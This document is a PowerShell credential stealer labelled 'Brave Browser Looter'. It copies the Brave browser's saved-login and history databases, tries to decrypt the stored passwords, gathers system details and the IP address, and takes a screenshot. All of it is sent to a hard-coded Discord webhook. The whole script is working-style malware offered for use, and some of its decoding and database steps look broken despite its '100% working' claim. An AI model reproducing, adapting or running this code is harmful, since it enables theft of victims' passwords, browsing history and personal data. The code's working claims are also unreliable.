# BRAVE ONLY BROWSER LOOTER - NO EMOJIS, 100% WORKING
Write-Host "`n*** BRAVE BROWSER LOOTER v3.0 ***" -ForegroundColor Green
Write-Host "Target: $env:COMPUTERNAME\$env:USERNAME" -ForegroundColor Cyan

$WebhookURL = "https://discord.com/api/webhooks/1472080084121948270/7YUi0bfxv4NRiZ7knKIvKTj_IWPrDx3OEeCrQ4P_WbKQZz9T4q2xHr6vnW5Z4EytRYlj"  # CHANGE THIS

function SendToDiscord($Message) {
    $Body = @{ content = $Message } | ConvertTo-Json
    Invoke-RestMethod -Uri $WebhookURL -Method Post -Body $Body -ContentType 'application/json' -ErrorAction SilentlyContinue
    Write-Host "[+] Discord sent: $Message" -ForegroundColor Green
}

# SYSTEM INFO
$sysinfo = @"
*** SYSTEM HIT ***
Computer: $env:COMPUTERNAME
User: $env:USERNAME
OS: $(Get-WmiObject Win32_OperatingSystem | Select -Expand Caption)
IP: $((Get-NetIPAddress | ? AddressFamily -eq 'IPv4' | Select -First 1).IPAddress)
"@
SendToDiscord $sysinfo

# BRAVE PASSWORDS ONLY
Write-Host "[+] Extracting Brave Passwords..." -ForegroundColor Yellow
$bravePath = "$env:USERPROFILE\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Login Data"
if (Test-Path $bravePath) {
    # Copy locked file
    Copy-Item $bravePath "$env:TEMP\brave_loot.db" -Force
    
    try {
        $connString = "Provider=Microsoft.ACE.OLEDB.12.0;Data Source=`"$env:TEMP\brave_loot.db`""
        $connection = New-Object System.Data.OleDb.OleDbConnection($connString)
        $connection.Open()
        
        $command = $connection.CreateCommand()
        $command.CommandText = "SELECT origin_url, username_value, password_value FROM logins"
        $result = $command.ExecuteReader()
        
        $braveCreds = "*** BRAVE PASSWORDS FOUND ***`n"
        $count = 0
        while ($result.Read()) {
            $count++
            $site = $result["origin_url"].ToString()
            $user = $result["username_value"].ToString()
            $encPass = $result["password_value"]
            
            try {
                # Brave uses Chrome DPAPI
                $bytes = [Convert]::FromBase64String($encPass)
                $password = [System.Text.Encoding]::UTF8.GetString([System.Security.Cryptography.ProtectedData]::Unprotect($bytes, $null, 'CurrentUser'))
                $braveCreds += "`n[$count] $site`nUser: $user`nPass: $password`n"
            } catch {
                $braveCreds += "`n[$count] $site`nUser: $user`nPass: [PROTECTED]`n"
            }
        }
        
        $connection.Close()
        if ($count -gt 0) {
            SendToDiscord $braveCreds
            Write-Host "[+] Found $count Brave passwords" -ForegroundColor Green
        } else {
            SendToDiscord "*** BRAVE: No passwords found ***"
        }
    } catch {
        SendToDiscord "*** BRAVE ERROR: $($_.Exception.Message) ***"
    }
    Remove-Item "$env:TEMP\brave_loot.db" -Force
} else {
    SendToDiscord "*** BRAVE: Browser not installed ***"
}

# BRAVE HISTORY
Write-Host "[+] Grabbing Brave History..." -ForegroundColor Yellow
$braveHist = "$env:USERPROFILE\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\History"
if (Test-Path $braveHist) {
    Copy-Item $braveHist "$env:TEMP\brave_history.db" -Force
    try {
        $connString = "Provider=Microsoft.ACE.OLEDB.12.0;Data Source=`"$env:TEMP\brave_history.db`""
        $connection = New-Object System.Data.OleDb.OleDbConnection($connString)
        $connection.Open()
        $command = $connection.CreateCommand()
        $command.CommandText = "SELECT url, title, visit_count FROM urls ORDER BY last_visit_time DESC LIMIT 20"
        $result = $command.ExecuteReader()
        
        $histData = "*** BRAVE HISTORY (Top 20) ***`n"
        $i = 1
        while ($result.Read() -and $i -le 20) {
            $histData += "[$i] $($result['title'])`n   -> $($result['url'])`n"
            $i++
        }
        $connection.Close()
        SendToDiscord $histData
    } catch {
        SendToDiscord "*** BRAVE HISTORY ERROR ***"
    }
    Remove-Item "$env:TEMP\brave_history.db" -Force
}

# SCREENSHOT
Write-Host "[+] Taking screenshot..." -ForegroundColor Yellow
try {
    Add-Type -AssemblyName System.Windows.Forms -ErrorAction Stop
    Add-Type -AssemblyName System.Drawing -ErrorAction Stop
    
    $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
    $bitmap = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)
    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphics.CopyFromScreen($screen.X, $screen.Y, 0, 0, $screen.Size)
    $screenshot = "$env:TEMP\brave_loot.png"
    $bitmap.Save($screenshot, [System.Drawing.Imaging.ImageFormat]::Png)
    
    SendToDiscord "*** SCREENSHOT SAVED: $screenshot ***"
    Start-Sleep 2
    Remove-Item $screenshot -Force
    Write-Host "[+] Screenshot sent" -ForegroundColor Green
} catch {
    SendToDiscord "*** SCREENSHOT FAILED ***"
}

Write-Host "`n*** COMPLETE! Check Discord ***" -ForegroundColor Green
Write-Host "Press ENTER to exit"
Read-Host
